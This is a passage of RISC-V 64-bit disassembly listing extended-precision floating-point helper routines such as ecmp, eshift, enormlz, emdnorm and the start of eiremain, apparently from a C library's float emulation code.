   1361c:	00015583          	lhu	a1,0(sp)
   13620:	02015783          	lhu	a5,32(sp)
   13624:	02b78d63          	beq	a5,a1,1365e <ecmp+0x80>
   13628:	00210793          	addi	a5,sp,2
   1362c:	02210713          	addi	a4,sp,34
   13630:	0830                	addi	a2,sp,24
   13632:	0007d683          	lhu	a3,0(a5)
   13636:	0789                	addi	a5,a5,2
   13638:	e2ad                	bnez	a3,1369a <ecmp+0xbc>
   1363a:	00075683          	lhu	a3,0(a4) # 8000 <register_fini-0x80b0>
   1363e:	0709                	addi	a4,a4,2
   13640:	eea9                	bnez	a3,1369a <ecmp+0xbc>
   13642:	fec798e3          	bne	a5,a2,13632 <ecmp+0x54>
   13646:	4501                	li	a0,0
   13648:	60e6                	ld	ra,88(sp)
   1364a:	6446                	ld	s0,80(sp)
   1364c:	64a6                	ld	s1,72(sp)
   1364e:	6125                	addi	sp,sp,96
   13650:	8082                	ret
   13652:	8522                	mv	a0,s0
   13654:	e63ff0ef          	jal	ra,134b6 <eisnan.part.0>
   13658:	d955                	beqz	a0,1360c <ecmp+0x2e>
   1365a:	5579                	li	a0,-2
   1365c:	b7f5                	j	13648 <ecmp+0x6a>
   1365e:	4505                	li	a0,1
   13660:	e1a9                	bnez	a1,136a2 <ecmp+0xc4>
   13662:	00215603          	lhu	a2,2(sp)
   13666:	02215683          	lhu	a3,34(sp)
   1366a:	00210713          	addi	a4,sp,2
   1366e:	02210793          	addi	a5,sp,34
   13672:	182c                	addi	a1,sp,56
   13674:	0789                	addi	a5,a5,2
   13676:	0709                	addi	a4,a4,2
   13678:	00d61c63          	bne	a2,a3,13690 <ecmp+0xb2>
   1367c:	fcb785e3          	beq	a5,a1,13646 <ecmp+0x68>
   13680:	00075603          	lhu	a2,0(a4)
   13684:	0007d683          	lhu	a3,0(a5)
   13688:	0709                	addi	a4,a4,2
   1368a:	0789                	addi	a5,a5,2
   1368c:	fed608e3          	beq	a2,a3,1367c <ecmp+0x9e>
   13690:	fac6ece3          	bltu	a3,a2,13648 <ecmp+0x6a>
   13694:	40a0053b          	negw	a0,a0
   13698:	bf45                	j	13648 <ecmp+0x6a>
   1369a:	4505                	li	a0,1
   1369c:	d5d5                	beqz	a1,13648 <ecmp+0x6a>
   1369e:	557d                	li	a0,-1
   136a0:	b765                	j	13648 <ecmp+0x6a>
   136a2:	557d                	li	a0,-1
   136a4:	bf7d                	j	13662 <ecmp+0x84>

00000000000136a6 <eisinf.part.0>:
   136a6:	1141                	addi	sp,sp,-16
   136a8:	e406                	sd	ra,8(sp)
   136aa:	e0dff0ef          	jal	ra,134b6 <eisnan.part.0>
   136ae:	60a2                	ld	ra,8(sp)
   136b0:	00153513          	seqz	a0,a0
   136b4:	0141                	addi	sp,sp,16
   136b6:	8082                	ret

00000000000136b8 <eshift.part.0>:
   136b8:	7179                	addi	sp,sp,-48
   136ba:	f022                	sd	s0,32(sp)
   136bc:	ec26                	sd	s1,24(sp)
   136be:	f406                	sd	ra,40(sp)
   136c0:	e84a                	sd	s2,16(sp)
   136c2:	e44e                	sd	s3,8(sp)
   136c4:	84ae                	mv	s1,a1
   136c6:	842a                	mv	s0,a0
   136c8:	0605cb63          	bltz	a1,1373e <eshift.part.0+0x86>
   136cc:	47bd                	li	a5,15
   136ce:	862e                	mv	a2,a1
   136d0:	0511                	addi	a0,a0,4
   136d2:	01840693          	addi	a3,s0,24
   136d6:	45bd                	li	a1,15
   136d8:	0297d063          	bge	a5,s1,136f8 <eshift.part.0+0x40>
   136dc:	87aa                	mv	a5,a0
   136de:	0027d703          	lhu	a4,2(a5)
   136e2:	0789                	addi	a5,a5,2
   136e4:	fee79f23          	sh	a4,-2(a5)
   136e8:	fed79be3          	bne	a5,a3,136de <eshift.part.0+0x26>
   136ec:	00041c23          	sh	zero,24(s0)
   136f0:	3641                	addiw	a2,a2,-16
   136f2:	fec5c5e3          	blt	a1,a2,136dc <eshift.part.0+0x24>
   136f6:	88bd                	andi	s1,s1,15
   136f8:	479d                	li	a5,7
   136fa:	0297d463          	bge	a5,s1,13722 <eshift.part.0+0x6a>
   136fe:	01840713          	addi	a4,s0,24
   13702:	00240593          	addi	a1,s0,2
   13706:	4781                	li	a5,0
   13708:	00075683          	lhu	a3,0(a4)
   1370c:	1779                	addi	a4,a4,-2
   1370e:	00869613          	slli	a2,a3,0x8
   13712:	8fd1                	or	a5,a5,a2
   13714:	00f71123          	sh	a5,2(a4)
   13718:	0086d793          	srli	a5,a3,0x8
   1371c:	feb716e3          	bne	a4,a1,13708 <eshift.part.0+0x50>
   13720:	34e1                	addiw	s1,s1,-8
   13722:	c491                	beqz	s1,1372e <eshift.part.0+0x76>
   13724:	34fd                	addiw	s1,s1,-1
   13726:	8522                	mv	a0,s0
   13728:	cc1ff0ef          	jal	ra,133e8 <eshup1>
   1372c:	fce5                	bnez	s1,13724 <eshift.part.0+0x6c>
   1372e:	4501                	li	a0,0
   13730:	70a2                	ld	ra,40(sp)
   13732:	7402                	ld	s0,32(sp)
   13734:	64e2                	ld	s1,24(sp)
   13736:	6942                	ld	s2,16(sp)
   13738:	69a2                	ld	s3,8(sp)
   1373a:	6145                	addi	sp,sp,48
   1373c:	8082                	ret
   1373e:	57c5                	li	a5,-15
   13740:	40b0093b          	negw	s2,a1
   13744:	0ef5d463          	bge	a1,a5,1382c <eshift.part.0+0x174>
   13748:	01850593          	addi	a1,a0,24
   1374c:	4981                	li	s3,0
   1374e:	00450693          	addi	a3,a0,4
   13752:	463d                	li	a2,15
   13754:	01845703          	lhu	a4,24(s0)
   13758:	87ae                	mv	a5,a1
   1375a:	00e9e9b3          	or	s3,s3,a4
   1375e:	ffe7d703          	lhu	a4,-2(a5)
   13762:	17f9                	addi	a5,a5,-2
   13764:	00e79123          	sh	a4,2(a5)
   13768:	fed79be3          	bne	a5,a3,1375e <eshift.part.0+0xa6>
   1376c:	00041223          	sh	zero,4(s0)
   13770:	3941                	addiw	s2,s2,-16
   13772:	ff2641e3          	blt	a2,s2,13754 <eshift.part.0+0x9c>
   13776:	57c1                	li	a5,-16
   13778:	5745                	li	a4,-15
   1377a:	9f85                	subw	a5,a5,s1
   1377c:	4901                	li	s2,0
   1377e:	08e4c063          	blt	s1,a4,137fe <eshift.part.0+0x146>
   13782:	00f9093b          	addw	s2,s2,a5
   13786:	479d                	li	a5,7
   13788:	0327df63          	bge	a5,s2,137c6 <eshift.part.0+0x10e>
   1378c:	0109999b          	slliw	s3,s3,0x10
   13790:	4109d99b          	sraiw	s3,s3,0x10
   13794:	01844783          	lbu	a5,24(s0)
   13798:	01a40593          	addi	a1,s0,26
   1379c:	00f9e9b3          	or	s3,s3,a5
   137a0:	19c2                	slli	s3,s3,0x30
   137a2:	0309d993          	srli	s3,s3,0x30
   137a6:	4781                	li	a5,0
   137a8:	0006d603          	lhu	a2,0(a3)
   137ac:	0689                	addi	a3,a3,2
   137ae:	0086571b          	srliw	a4,a2,0x8
   137b2:	8f5d                	or	a4,a4,a5
   137b4:	0086179b          	slliw	a5,a2,0x8
   137b8:	17c2                	slli	a5,a5,0x30
   137ba:	fee69f23          	sh	a4,-2(a3)
   137be:	93c1                	srli	a5,a5,0x30
   137c0:	feb694e3          	bne	a3,a1,137a8 <eshift.part.0+0xf0>
   137c4:	3961                	addiw	s2,s2,-8
   137c6:	04090b63          	beqz	s2,1381c <eshift.part.0+0x164>
   137ca:	01845783          	lhu	a5,24(s0)
   137ce:	397d                	addiw	s2,s2,-1
   137d0:	8522                	mv	a0,s0
   137d2:	8b85                	andi	a5,a5,1
   137d4:	0137e9b3          	or	s3,a5,s3
   137d8:	bc5ff0ef          	jal	ra,1339c <eshdn1>
   137dc:	fe0917e3          	bnez	s2,137ca <eshift.part.0+0x112>
   137e0:	0109979b          	slliw	a5,s3,0x10
   137e4:	4107d79b          	sraiw	a5,a5,0x10
   137e8:	e78d                	bnez	a5,13812 <eshift.part.0+0x15a>
   137ea:	03099513          	slli	a0,s3,0x30
   137ee:	9141                	srli	a0,a0,0x30
   137f0:	70a2                	ld	ra,40(sp)
   137f2:	7402                	ld	s0,32(sp)
   137f4:	64e2                	ld	s1,24(sp)
   137f6:	6942                	ld	s2,16(sp)
   137f8:	69a2                	ld	s3,8(sp)
   137fa:	6145                	addi	sp,sp,48
   137fc:	8082                	ret
   137fe:	ff07f913          	andi	s2,a5,-16
   13802:	4120093b          	negw	s2,s2
   13806:	00f9093b          	addw	s2,s2,a5
   1380a:	479d                	li	a5,7
   1380c:	fb27dde3          	bge	a5,s2,137c6 <eshift.part.0+0x10e>
   13810:	bfb5                	j	1378c <eshift.part.0+0xd4>
   13812:	4985                	li	s3,1
   13814:	03099513          	slli	a0,s3,0x30
   13818:	9141                	srli	a0,a0,0x30
   1381a:	bfd9                	j	137f0 <eshift.part.0+0x138>
   1381c:	854e                	mv	a0,s3
   1381e:	00099563          	bnez	s3,13828 <eshift.part.0+0x170>
   13822:	1542                	slli	a0,a0,0x30
   13824:	9141                	srli	a0,a0,0x30
   13826:	b729                	j	13730 <eshift.part.0+0x78>
   13828:	4505                	li	a0,1
   1382a:	bfe5                	j	13822 <eshift.part.0+0x16a>
   1382c:	57e5                	li	a5,-7
   1382e:	4981                	li	s3,0
   13830:	f8f5dde3          	bge	a1,a5,137ca <eshift.part.0+0x112>
   13834:	00440693          	addi	a3,s0,4
   13838:	bfb1                	j	13794 <eshift.part.0+0xdc>

000000000001383a <enormlz>:
   1383a:	00455783          	lhu	a5,4(a0)
   1383e:	1101                	addi	sp,sp,-32
   13840:	e426                	sd	s1,8(sp)
   13842:	ec06                	sd	ra,24(sp)
   13844:	e822                	sd	s0,16(sp)
   13846:	e04a                	sd	s2,0(sp)
   13848:	84aa                	mv	s1,a0
   1384a:	ebc5                	bnez	a5,138fa <enormlz+0xc0>
   1384c:	00655703          	lhu	a4,6(a0)
   13850:	4401                	li	s0,0
   13852:	0107179b          	slliw	a5,a4,0x10
   13856:	4107d79b          	sraiw	a5,a5,0x10
   1385a:	02079693          	slli	a3,a5,0x20
   1385e:	0806c763          	bltz	a3,138ec <enormlz+0xb2>
   13862:	01a50693          	addi	a3,a0,26
   13866:	0a000613          	li	a2,160
   1386a:	e31d                	bnez	a4,13890 <enormlz+0x56>
   1386c:	00648793          	addi	a5,s1,6
   13870:	a019                	j	13876 <enormlz+0x3c>
   13872:	0007d703          	lhu	a4,0(a5)
   13876:	0789                	addi	a5,a5,2
   13878:	fee79e23          	sh	a4,-4(a5)
   1387c:	fef69be3          	bne	a3,a5,13872 <enormlz+0x38>
   13880:	00049c23          	sh	zero,24(s1)
   13884:	2441                	addiw	s0,s0,16
   13886:	06c40363          	beq	s0,a2,138ec <enormlz+0xb2>
   1388a:	0064d703          	lhu	a4,6(s1)
   1388e:	df79                	beqz	a4,1386c <enormlz+0x32>
   13890:	f0077793          	andi	a5,a4,-256
   13894:	eb8d                	bnez	a5,138c6 <enormlz+0x8c>
   13896:	01848513          	addi	a0,s1,24
   1389a:	00248593          	addi	a1,s1,2
   1389e:	4781                	li	a5,0
   138a0:	872a                	mv	a4,a0
   138a2:	00075683          	lhu	a3,0(a4)
   138a6:	1779                	addi	a4,a4,-2
   138a8:	00869613          	slli	a2,a3,0x8
   138ac:	8fd1                	or	a5,a5,a2
   138ae:	00f71123          	sh	a5,2(a4)
   138b2:	0086d793          	srli	a5,a3,0x8
   138b6:	fee596e3          	bne	a1,a4,138a2 <enormlz+0x68>
   138ba:	0064d703          	lhu	a4,6(s1)
   138be:	2421                	addiw	s0,s0,8
   138c0:	f0077793          	andi	a5,a4,-256
   138c4:	dfe9                	beqz	a5,1389e <enormlz+0x64>
   138c6:	0a000913          	li	s2,160
   138ca:	a801                	j	138da <enormlz+0xa0>
   138cc:	2405                	addiw	s0,s0,1
   138ce:	b1bff0ef          	jal	ra,133e8 <eshup1>
   138d2:	00894d63          	blt	s2,s0,138ec <enormlz+0xb2>
   138d6:	0064d703          	lhu	a4,6(s1)
   138da:	0107171b          	slliw	a4,a4,0x10
   138de:	4107571b          	sraiw	a4,a4,0x10
   138e2:	02071793          	slli	a5,a4,0x20
   138e6:	8526                	mv	a0,s1
   138e8:	fe07d2e3          	bgez	a5,138cc <enormlz+0x92>
   138ec:	60e2                	ld	ra,24(sp)
   138ee:	8522                	mv	a0,s0
   138f0:	6442                	ld	s0,16(sp)
   138f2:	64a2                	ld	s1,8(sp)
   138f4:	6902                	ld	s2,0(sp)
   138f6:	6105                	addi	sp,sp,32
   138f8:	8082                	ret
   138fa:	f007f713          	andi	a4,a5,-256
   138fe:	4401                	li	s0,0
   13900:	e705                	bnez	a4,13928 <enormlz+0xee>
   13902:	f6f00913          	li	s2,-145
   13906:	a801                	j	13916 <enormlz+0xdc>
   13908:	347d                	addiw	s0,s0,-1
   1390a:	a93ff0ef          	jal	ra,1339c <eshdn1>
   1390e:	fd240fe3          	beq	s0,s2,138ec <enormlz+0xb2>
   13912:	0044d783          	lhu	a5,4(s1)
   13916:	8526                	mv	a0,s1
   13918:	fbe5                	bnez	a5,13908 <enormlz+0xce>
   1391a:	60e2                	ld	ra,24(sp)
   1391c:	8522                	mv	a0,s0
   1391e:	6442                	ld	s0,16(sp)
   13920:	64a2                	ld	s1,8(sp)
   13922:	6902                	ld	s2,0(sp)
   13924:	6105                	addi	sp,sp,32
   13926:	8082                	ret
   13928:	00450693          	addi	a3,a0,4
   1392c:	01a50593          	addi	a1,a0,26
   13930:	4701                	li	a4,0
   13932:	a019                	j	13938 <enormlz+0xfe>
   13934:	0006d783          	lhu	a5,0(a3)
   13938:	0087d61b          	srliw	a2,a5,0x8
   1393c:	8f51                	or	a4,a4,a2
   1393e:	0087979b          	slliw	a5,a5,0x8
   13942:	00e69023          	sh	a4,0(a3)
   13946:	03079713          	slli	a4,a5,0x30
   1394a:	0689                	addi	a3,a3,2
   1394c:	9341                	srli	a4,a4,0x30
   1394e:	feb693e3          	bne	a3,a1,13934 <enormlz+0xfa>
   13952:	0044d783          	lhu	a5,4(s1)
   13956:	5461                	li	s0,-8
   13958:	b76d                	j	13902 <enormlz+0xc8>

000000000001395a <emdnorm>:
   1395a:	7139                	addi	sp,sp,-64
   1395c:	f822                	sd	s0,48(sp)
   1395e:	f426                	sd	s1,40(sp)
   13960:	f04a                	sd	s2,32(sp)
   13962:	ec4e                	sd	s3,24(sp)
   13964:	e852                	sd	s4,16(sp)
   13966:	e456                	sd	s5,8(sp)
   13968:	8936                	mv	s2,a3
   1396a:	84be                	mv	s1,a5
   1396c:	fc06                	sd	ra,56(sp)
   1396e:	842a                	mv	s0,a0
   13970:	89ae                	mv	s3,a1
   13972:	8a32                	mv	s4,a2
   13974:	8aba                	mv	s5,a4
   13976:	ec5ff0ef          	jal	ra,1383a <enormlz>
   1397a:	09000793          	li	a5,144
   1397e:	40a90933          	sub	s2,s2,a0
   13982:	12a7db63          	bge	a5,a0,13ab8 <emdnorm+0x15e>
   13986:	67a1                	lui	a5,0x8
   13988:	17f9                	addi	a5,a5,-2
   1398a:	1927dd63          	bge	a5,s2,13b24 <emdnorm+0x1ca>
   1398e:	160a8b63          	beqz	s5,13b04 <emdnorm+0x1aa>
   13992:	40c8                	lw	a0,4(s1)
   13994:	409c                	lw	a5,0(s1)
   13996:	04a78e63          	beq	a5,a0,139f2 <emdnorm+0x98>
   1399a:	01a48713          	addi	a4,s1,26
   1399e:	03448793          	addi	a5,s1,52
   139a2:	0709                	addi	a4,a4,2
   139a4:	fe071f23          	sh	zero,-2(a4)
   139a8:	fef71de3          	bne	a4,a5,139a2 <emdnorm+0x48>
   139ac:	03800793          	li	a5,56
   139b0:	28f50263          	beq	a0,a5,13c34 <emdnorm+0x2da>
   139b4:	12a7d163          	bge	a5,a0,13ad6 <emdnorm+0x17c>
   139b8:	04000793          	li	a5,64
   139bc:	24f50c63          	beq	a0,a5,13c14 <emdnorm+0x2ba>
   139c0:	07100793          	li	a5,113
   139c4:	28f51163          	bne	a0,a5,13c46 <emdnorm+0x2ec>
   139c8:	47a9                	li	a5,10
   139ca:	40008737          	lui	a4,0x40008
   139ce:	177d                	addi	a4,a4,-1
   139d0:	1782                	slli	a5,a5,0x20
   139d2:	07a9                	addi	a5,a5,10
   139d4:	c8d8                	sw	a4,20(s1)
   139d6:	7761                	lui	a4,0xffff8
   139d8:	00e49c23          	sh	a4,24(s1)
   139dc:	e49c                	sd	a5,8(s1)
   139de:	6721                	lui	a4,0x8
   139e0:	47a9                	li	a5,10
   139e2:	07a1                	addi	a5,a5,8
   139e4:	0786                	slli	a5,a5,0x1
   139e6:	97a6                	add	a5,a5,s1
   139e8:	00e79523          	sh	a4,10(a5) # 800a <register_fini-0x80a6>
   139ec:	c088                	sw	a0,0(s1)
   139ee:	17205163          	blez	s2,13b50 <emdnorm+0x1f6>
   139f2:	4494                	lw	a3,8(s1)
   139f4:	0144d603          	lhu	a2,20(s1)
   139f8:	08f00793          	li	a5,143
   139fc:	00169713          	slli	a4,a3,0x1
   13a00:	00e40833          	add	a6,s0,a4
   13a04:	00085883          	lhu	a7,0(a6) # ffffffffffff8000 <__BSS_END__+0xfffffffffffc0100>
   13a08:	00c8f5b3          	and	a1,a7,a2
   13a0c:	02a7ce63          	blt	a5,a0,13a48 <emdnorm+0xee>
   13a10:	47ad                	li	a5,11
   13a12:	02d7cb63          	blt	a5,a3,13a48 <emdnorm+0xee>
   13a16:	9f95                	subw	a5,a5,a3
   13a18:	1782                	slli	a5,a5,0x20
   13a1a:	9381                	srli	a5,a5,0x20
   13a1c:	97b6                	add	a5,a5,a3
   13a1e:	00179693          	slli	a3,a5,0x1
   13a22:	0709                	addi	a4,a4,2
   13a24:	00440793          	addi	a5,s0,4
   13a28:	9722                	add	a4,a4,s0
   13a2a:	97b6                	add	a5,a5,a3
   13a2c:	00075683          	lhu	a3,0(a4) # 8000 <register_fini-0x80b0>
   13a30:	c299                	beqz	a3,13a36 <emdnorm+0xdc>
   13a32:	0015e593          	ori	a1,a1,1
   13a36:	00071023          	sh	zero,0(a4)
   13a3a:	0709                	addi	a4,a4,2
   13a3c:	fee798e3          	bne	a5,a4,13a2c <emdnorm+0xd2>
   13a40:	00085883          	lhu	a7,0(a6)
   13a44:	0144d603          	lhu	a2,20(s1)
   13a48:	fff64613          	not	a2,a2
   13a4c:	01167633          	and	a2,a2,a7
   13a50:	00c81023          	sh	a2,0(a6)
   13a54:	0164d783          	lhu	a5,22(s1)
   13a58:	00b7f733          	and	a4,a5,a1
   13a5c:	cb05                	beqz	a4,13a8c <emdnorm+0x132>
   13a5e:	12b78f63          	beq	a5,a1,13b9c <emdnorm+0x242>
   13a62:	03248613          	addi	a2,s1,50
   13a66:	01840693          	addi	a3,s0,24
   13a6a:	04f1                	addi	s1,s1,28
   13a6c:	4701                	li	a4,0
   13a6e:	00065783          	lhu	a5,0(a2)
   13a72:	0006d583          	lhu	a1,0(a3)
   13a76:	16f9                	addi	a3,a3,-2
   13a78:	1679                	addi	a2,a2,-2
   13a7a:	97ae                	add	a5,a5,a1
   13a7c:	97ba                	add	a5,a5,a4
   13a7e:	0107d713          	srli	a4,a5,0x10
   13a82:	00f69123          	sh	a5,2(a3)
   13a86:	8b05                	andi	a4,a4,1
   13a88:	fe9613e3          	bne	a2,s1,13a6e <emdnorm+0x114>
   13a8c:	13205663          	blez	s2,13bb8 <emdnorm+0x25e>
   13a90:	00445783          	lhu	a5,4(s0)
   13a94:	e7ed                	bnez	a5,13b7e <emdnorm+0x224>
   13a96:	67a1                	lui	a5,0x8
   13a98:	00041c23          	sh	zero,24(s0)
   13a9c:	17f9                	addi	a5,a5,-2
   13a9e:	0727c563          	blt	a5,s2,13b08 <emdnorm+0x1ae>
   13aa2:	01241123          	sh	s2,2(s0)
   13aa6:	70e2                	ld	ra,56(sp)
   13aa8:	7442                	ld	s0,48(sp)
   13aaa:	74a2                	ld	s1,40(sp)
   13aac:	7902                	ld	s2,32(sp)
   13aae:	69e2                	ld	s3,24(sp)
   13ab0:	6a42                	ld	s4,16(sp)
   13ab2:	6aa2                	ld	s5,8(sp)
   13ab4:	6121                	addi	sp,sp,64
   13ab6:	8082                	ret
   13ab8:	0a095a63          	bgez	s2,13b6c <emdnorm+0x212>
   13abc:	f7000793          	li	a5,-144
   13ac0:	06f95b63          	bge	s2,a5,13b36 <emdnorm+0x1dc>
   13ac4:	00240793          	addi	a5,s0,2
   13ac8:	0469                	addi	s0,s0,26
   13aca:	0789                	addi	a5,a5,2
   13acc:	fe079f23          	sh	zero,-2(a5) # 7ffe <register_fini-0x80b2>
   13ad0:	fe879de3          	bne	a5,s0,13aca <emdnorm+0x170>
   13ad4:	bfc9                	j	13aa6 <emdnorm+0x14c>
   13ad6:	47e1                	li	a5,24
   13ad8:	10f50f63          	beq	a0,a5,13bf6 <emdnorm+0x29c>
   13adc:	03500793          	li	a5,53
   13ae0:	16f51363          	bne	a0,a5,13c46 <emdnorm+0x2ec>
   13ae4:	040006b7          	lui	a3,0x4000
   13ae8:	6705                	lui	a4,0x1
   13aea:	7ff68693          	addi	a3,a3,2047 # 40007ff <__BSS_END__+0x3fc88ff>
   13aee:	4799                	li	a5,6
   13af0:	80070713          	addi	a4,a4,-2048 # 800 <register_fini-0xf8b0>
   13af4:	c8d4                	sw	a3,20(s1)
   13af6:	1782                	slli	a5,a5,0x20
   13af8:	0799                	addi	a5,a5,6
   13afa:	e49c                	sd	a5,8(s1)
   13afc:	00e49c23          	sh	a4,24(s1)
   13b00:	4799                	li	a5,6
   13b02:	b5c5                	j	139e2 <emdnorm+0x88>
   13b04:	00041c23          	sh	zero,24(s0)
   13b08:	77e1                	lui	a5,0xffff8
   13b0a:	fff7c793          	not	a5,a5
   13b0e:	00f41123          	sh	a5,2(s0)
   13b12:	00440793          	addi	a5,s0,4
   13b16:	0461                	addi	s0,s0,24
   13b18:	00079023          	sh	zero,0(a5) # ffffffffffff8000 <__BSS_END__+0xfffffffffffc0100>
   13b1c:	0789                	addi	a5,a5,2
   13b1e:	fef41de3          	bne	s0,a5,13b18 <emdnorm+0x1be>
   13b22:	b751                	j	13aa6 <emdnorm+0x14c>
   13b24:	00240793          	addi	a5,s0,2
   13b28:	0469                	addi	s0,s0,26
   13b2a:	0789                	addi	a5,a5,2
   13b2c:	fe079f23          	sh	zero,-2(a5)
   13b30:	fe879de3          	bne	a5,s0,13b2a <emdnorm+0x1d0>
   13b34:	bf8d                	j	13aa6 <emdnorm+0x14c>
   13b36:	0009059b          	sext.w	a1,s2
   13b3a:	8522                	mv	a0,s0
   13b3c:	b7dff0ef          	jal	ra,136b8 <eshift.part.0>
   13b40:	c111                	beqz	a0,13b44 <emdnorm+0x1ea>
   13b42:	4985                	li	s3,1
   13b44:	0a0a8463          	beqz	s5,13bec <emdnorm+0x292>
   13b48:	40c8                	lw	a0,4(s1)
   13b4a:	409c                	lw	a5,0(s1)
   13b4c:	e4a797e3          	bne	a5,a0,1399a <emdnorm+0x40>
   13b50:	09000793          	li	a5,144
   13b54:	08f50163          	beq	a0,a5,13bd6 <emdnorm+0x27c>
   13b58:	01845783          	lhu	a5,24(s0)
   13b5c:	8522                	mv	a0,s0
   13b5e:	8b85                	andi	a5,a5,1
   13b60:	00f9e9b3          	or	s3,s3,a5
   13b64:	839ff0ef          	jal	ra,1339c <eshdn1>
   13b68:	40c8                	lw	a0,4(s1)
   13b6a:	b561                	j	139f2 <emdnorm+0x98>
   13b6c:	f20a85e3          	beqz	s5,13a96 <emdnorm+0x13c>
   13b70:	40c8                	lw	a0,4(s1)
   13b72:	409c                	lw	a5,0(s1)
   13b74:	e2a793e3          	bne	a5,a0,1399a <emdnorm+0x40>
   13b78:	e7204de3          	bgtz	s2,139f2 <emdnorm+0x98>
   13b7c:	bfd1                	j	13b50 <emdnorm+0x1f6>
   13b7e:	8522                	mv	a0,s0
   13b80:	81dff0ef          	jal	ra,1339c <eshdn1>
   13b84:	67a1                	lui	a5,0x8
   13b86:	0905                	addi	s2,s2,1
   13b88:	00041c23          	sh	zero,24(s0)
   13b8c:	17f9                	addi	a5,a5,-2
   13b8e:	f727cde3          	blt	a5,s2,13b08 <emdnorm+0x1ae>
   13b92:	f00958e3          	bgez	s2,13aa2 <emdnorm+0x148>
   13b96:	00041123          	sh	zero,2(s0)
   13b9a:	b731                	j	13aa6 <emdnorm+0x14c>
   13b9c:	08099963          	bnez	s3,13c2e <emdnorm+0x2d4>
   13ba0:	44dc                	lw	a5,12(s1)
   13ba2:	0184d703          	lhu	a4,24(s1)
   13ba6:	0786                	slli	a5,a5,0x1
   13ba8:	97a2                	add	a5,a5,s0
   13baa:	0007d783          	lhu	a5,0(a5) # 8000 <register_fini-0x80b0>
   13bae:	8ff9                	and	a5,a5,a4
   13bb0:	ea0799e3          	bnez	a5,13a62 <emdnorm+0x108>
   13bb4:	ed204ee3          	bgtz	s2,13a90 <emdnorm+0x136>
   13bb8:	09000793          	li	a5,144
   13bbc:	00f50563          	beq	a0,a5,13bc6 <emdnorm+0x26c>
   13bc0:	8522                	mv	a0,s0
   13bc2:	827ff0ef          	jal	ra,133e8 <eshup1>
   13bc6:	00445783          	lhu	a5,4(s0)
   13bca:	fbd5                	bnez	a5,13b7e <emdnorm+0x224>
   13bcc:	00041c23          	sh	zero,24(s0)
   13bd0:	fc0943e3          	bltz	s2,13b96 <emdnorm+0x23c>
   13bd4:	b5f9                	j	13aa2 <emdnorm+0x148>
   13bd6:	0084a803          	lw	a6,8(s1)
   13bda:	0144d603          	lhu	a2,20(s1)
   13bde:	0806                	slli	a6,a6,0x1
   13be0:	9822                	add	a6,a6,s0
   13be2:	00085883          	lhu	a7,0(a6)
   13be6:	011675b3          	and	a1,a2,a7
   13bea:	bdb9                	j	13a48 <emdnorm+0xee>
   13bec:	00041c23          	sh	zero,24(s0)
   13bf0:	00041123          	sh	zero,2(s0)
   13bf4:	bd4d                	j	13aa6 <emdnorm+0x14c>
   13bf6:	4791                	li	a5,4
   13bf8:	00800737          	lui	a4,0x800
   13bfc:	0ff70713          	addi	a4,a4,255 # 8000ff <__BSS_END__+0x7c81ff>
   13c00:	1782                	slli	a5,a5,0x20
   13c02:	0791                	addi	a5,a5,4
   13c04:	c8d8                	sw	a4,20(s1)
   13c06:	10000713          	li	a4,256
   13c0a:	e49c                	sd	a5,8(s1)
   13c0c:	00e49c23          	sh	a4,24(s1)
   13c10:	4791                	li	a5,4
   13c12:	bbc1                	j	139e2 <emdnorm+0x88>
   13c14:	478d                	li	a5,3
   13c16:	80010737          	lui	a4,0x80010
   13c1a:	177d                	addi	a4,a4,-1
   13c1c:	1786                	slli	a5,a5,0x21
   13c1e:	079d                	addi	a5,a5,7
   13c20:	c8d8                	sw	a4,20(s1)
   13c22:	4705                	li	a4,1
   13c24:	e49c                	sd	a5,8(s1)
   13c26:	00e49c23          	sh	a4,24(s1)
   13c2a:	4799                	li	a5,6
   13c2c:	bb5d                	j	139e2 <emdnorm+0x88>
   13c2e:	e20a0ae3          	beqz	s4,13a62 <emdnorm+0x108>
   13c32:	bda9                	j	13a8c <emdnorm+0x132>
   13c34:	00800737          	lui	a4,0x800
   13c38:	0ff70713          	addi	a4,a4,255 # 8000ff <__BSS_END__+0x7c81ff>
   13c3c:	c8d8                	sw	a4,20(s1)
   13c3e:	4799                	li	a5,6
   13c40:	10000713          	li	a4,256
   13c44:	bd4d                	j	13af6 <emdnorm+0x19c>
   13c46:	47ad                	li	a5,11
   13c48:	80010737          	lui	a4,0x80010
   13c4c:	177d                	addi	a4,a4,-1
   13c4e:	1782                	slli	a5,a5,0x20
   13c50:	07b1                	addi	a5,a5,12
   13c52:	c8d8                	sw	a4,20(s1)
   13c54:	4705                	li	a4,1
   13c56:	e49c                	sd	a5,8(s1)
   13c58:	00e49c23          	sh	a4,24(s1)
   13c5c:	47ad                	li	a5,11
   13c5e:	b351                	j	139e2 <emdnorm+0x88>

0000000000013c60 <eiremain>:
   13c60:	711d                	addi	sp,sp,-96
   13c62:	e4a6                	sd	s1,72(sp)
   13c64:	fc4e                	sd	s3,56(sp)
   13c66:	84ae                	mv	s1,a1
   13c68:	00255983          	lhu	s3,2(a0)
   13c6c:	ec86                	sd	ra,88(sp)
   13c6e:	e8a2                	sd	s0,80(sp)
   13c70:	e0ca                	sd	s2,64(sp)
   13c72:	f852                	sd	s4,48(sp)
   13c74:	8932                	mv	s2,a2
   13c76:	f456                	sd	s5,40(sp)
   13c78:	f05a                	sd	s6,32(sp)
   13c7a:	ec5e                	sd	s7,24(sp)
   13c7c:	e862                	sd	s8,16(sp)
   13c7e:	e466                	sd	s9,8(sp)
   13c80:	e06a                	sd	s10,0(sp)
   13c82:	8a2a                	mv	s4,a0
   13c84:	bb7ff0ef          	jal	ra,1383a <enormlz>
   13c88:	0024d403          	lhu	s0,2(s1)
   13c8c:	87aa                	mv	a5,a0
   13c8e:	8526                	mv	a0,s1
   13c90:	40f989b3          	sub	s3,s3,a5
   13c94:	03490a93          	addi	s5,s2,52
   13c98:	ba3ff0ef          	jal	ra,1383a <enormlz>
   13c9c:	8c09                	sub	s0,s0,a0
   13c9e:	04e90713          	addi	a4,s2,78
   13ca2:	87d6                	mv	a5,s5
   13ca4:	0789                	addi	a5,a5,2
   13ca6:	fe079f23          	sh	zero,-2(a5)
   13caa:	fee79de3          	bne	a5,a4,13ca4 <eiremain+0x44>
   13cae:	07344b63          	blt	s0,s3,13d24 <eiremain+0xc4>
   13cb2:	004a0b93          	addi	s7,s4,4
   13cb6:	00448b13          	addi	s6,s1,4
   13cba:	19fd                	addi	s3,s3,-1
   13cbc:	01aa0c93          	addi	s9,s4,26
   13cc0:	00248c13          	addi	s8,s1,2
